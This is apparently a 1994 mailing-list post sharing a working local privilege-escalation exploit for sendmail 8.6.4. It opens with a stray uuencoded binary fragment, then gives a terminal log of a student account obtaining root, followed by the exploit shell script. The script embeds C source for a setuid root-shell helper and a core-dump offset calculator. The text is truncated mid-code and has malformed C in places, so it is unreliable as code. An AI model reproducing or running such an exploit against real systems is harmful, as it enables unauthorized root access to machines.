M$"**R!@@#P[$ D)JX<)$L&^%!4%&_/X'+&1\H0QT* ,>,/A#,H2!#F$ P _=atreus
M0 8 S &):G(B%.GP!3.PX0U'5.(/\9 &(B**44HL@QOLD(8RN4&+1,B"$X+0atreus
MA"0,(8Q<).(8T-"&-S3Q"W-\PQW.^(4^?I&/<P!B'=)PQS>X88M=U*(0N_@%atreus
M,M2A#6W(0R/+,(:L]?$+0Z#"$Z3P!28D80I4Z*,6OT $37+2DZ 4Y27)\(8Oatreus
MG.&*8@@#&_!(AS?(80ZC9*4K82G+1M;REHJ,8R,?&<DO5,H,PWM!&<I ACG8atreus
M84ID2,,<UC #*KUA#+*DTY7.,(8QM$!0+Y@#',(@!V_.H0YN:,$YWS0'&K@@atreus
M!BZHI@Q<4(-XZD"9S'0F-*5)36MBDPW:'-X!Z**0"6).<0<004XB]Y Q ( ,atreus
M61N>1"=*T8I:]*(8S:A&-\K1CGKTHR -J4A'2M*2FO2D*$VI2E?*TI:Z]*4Patreus
MC:E,9TK3FMKTICC-J4YWRM.>^O2G0 VJ4(=*U*(:]:A(3:I2E\K4ICKUJ5"-atreus
MJE2G2M6J6O6J6,VJ5K?*U:YZ]:M@#:M8QTK6LIKUK&A-JUK7RM:VNO6M<(VKatreus
M7.=*U[K:]:YXS>M2_0,$UP&+!"<MW>'V!BPN"(5D !B !W4"6)U0;R&5*P Ratreus
M$()#[@$ L3XQ7"" 0;*HO H43OL'/SQ+%= ^+1]!"<!G0VN/H A@M4^;1U &atreus
M -M_P",H!*AM.X)2@-JJ(RB(DR@0%JO7XAKWN,A-KG*7R]SF.O>YT(VN=*=+atreus
MW>I:][K8S:YVM\O=[GKWN^ -KWC'2][RFO>\Z$VO>M?+WO:Z][WPC:]\YTO?atreus
+^MKWOOC-KW[WFUS=atreus
 atreus
endatreus
----------------------- CuT HeRe -------------------------------------

Here it is the other script:

       
/* What follows is a sample run exercising the latest sendmail hole and the
script used to exploit this hole.  This is a re-send; I neglected
to escape the "." in the sendmail script, leaving the program
slightly truncated.  To fix this, I have escaped the . so prior
to executing this you must remove the \.  (does that make any sense? :-)
There was also a small problem with nested quotes pointed out by Peter
Wemm which I have fixed.

This is the "small version" of the script; it assumes you have a sane
sendmail.cf.  In this manner, it is not a particularly robust "breakin
script" but I believe it does illustrate how to exploit the bug.

This program uses "calc.c," the program mentioned by Timothy Newsham in
an earlier message.  The program has been modified slightly so that it
gives better results (it would occasionally fail to locate the offset of
a config given a buggy sendmail.  The fix is to force a sync() after
it generates a coredump.)  The remainder of the program was written
by myself and a fellow student, Steven Dake.

We have held off on releasing this script until we were able to notify
the people responsible for system security at NAU.  Locals subscribing
to this digest beware; sendmail on our machines has been patched! :-) */

Script started on Thu Mar 24 00:54:54 1994
[pine] [1] date
Thu Mar 24 00:54:57 MST 1994
[pine] [2] whoami
jwa
[pine] [3] id
uid=4473(jwa) gid=400(student)
[pine] [4] ls -l sendbug.sh
-rwx------   1 jwa      student     4893 Mar 24 00:46 sendbug.sh*
[pine] [5] sendbug.sh
Creating setid0 ...
Creating calc...
Scanning core image for /nau/local/lib/mail/sendmail.cf...
Creating alias.sh ...
Creating fake alias file...
Faking alias pointer in new config file...
Creating the sendmail script...
Executing /usr/lib/sendmail -
d4294935548.47,4294935549.116,4294935550.109,4294935551.112,4294935552.47,4294935553.115,429
4935554.109,4294935555.46,4294935556.9
Version 8.6.4
220-pine.cse.nau.edu Sendmail 8.6.4/WHOOP-v1.0 ready at Thu, 24 Mar 1994 
00:55:21 -0700
220 ESMTP spoken here
250 pine.cse.nau.edu Hello jwa@localhost, pleased to meet you
250 <nobody>... Sender ok
250 <yash>... Recipient ok
354 Enter mail, end with "." on a line by itself
250 AAA01803 Message accepted for delivery
503 Need MAIL before RCPT
503 Need MAIL command
500 Command unrecognized
500 Command unrecognized
221 pine.cse.nau.edu closing connection
setid0 is a suid shell.  executing...
executing /bin/csh...
pine# whoami
root
pine# id
uid=0(root) gid=0(root)
pine# exit
pine# end of script.

. and here's the program.

#!/bin/sh
# exploit new sendmail bug to give us a root shell
# 24 mar 94  jwa/scd @nau.edu
# "short version"
# tested on sunos 5.2/sendmail 8.6.4

# location of sendmail
SENDMAIL=/usr/lib/sendmail

# location of original sendmail.cf file
CONFIG=/nau/local/lib/mail/sendmail.cf
#CONFIG=`strings $SENDMAIL | grep sendmail.cf`

# program to execute as root
SHELL=/bin/csh

TEMPDIR=/tmp/sendbug-tmp.$$
mkdir $TEMPDIR
chmod 700 $TEMPDIR
cd $TEMPDIR

cp $SENDMAIL sm
chmod 700 sm

echo "Creating setid0 ..."
cat > setid.c << _EOF_

/* set uid to zero, thus escaping the annoying csh and solaris sh
 * problem..
 *
 * if (getuid() != geteuid()) {
 *  printf("permission denied, you root-hacker you.\n");
 *  exit(1);
 * }
 *
 * .. must be run euid 0, obviously.  with no args it runs /bin/sh,
 * otherwise it runs the 1st arg.
 */

#include <stdio.h>

main(argc, argv)
int argc;
char *argv[];

 int uid;

 setuid(0);
 setgid(0);
 seteuid(0);  /* probabally redundant. */
 setegid(0);

 uid = getuid();

 if (uid != 0) {
  printf("setuid(0); failed!  aborting..\n");
  exit(1);
 }

 if (argc !=2) {
  printf("executing /bin/sh...\n");
  system("/bin/sh");
 }
  else
 {
  printf("executing %s...\n", argv[1]);
  system(argv[1]);
 }

_EOF_

cc -o setid0 setid.c

echo "Creating calc..."

cat > calc.c << _EOF_
/*
 * Determines offset in sendmail of
 * sendmail.cf file location.
 * author: timothy newsham
 */
#include <fcntl.h>

gencore()

  int pid;
  int fd[2];

  if(pipe(fd) < 0) {
    perror("pipe");
    exit(1);
    return(0);
  }
  pid = fork();
  if(!pid) {
    int f = open("./out", O_RDWR|O_CREAT, 0666);
    dup2(f, 1); dup2(fd[0], 0);
    close(f); close(fd[1]); close(fd[0]);
    execl("./sm","sm","-d0-9.90","-oQ.","-bs", 0);
    perror("exec");
    exit(0);
  } else {
    sleep(2);
    kill(pid, 11);
  }
  close(fd[0]);
  close(fd[1]);


main(argc,argv)
char **argv;
int argc;

  unsigned int ConfFile,tTdv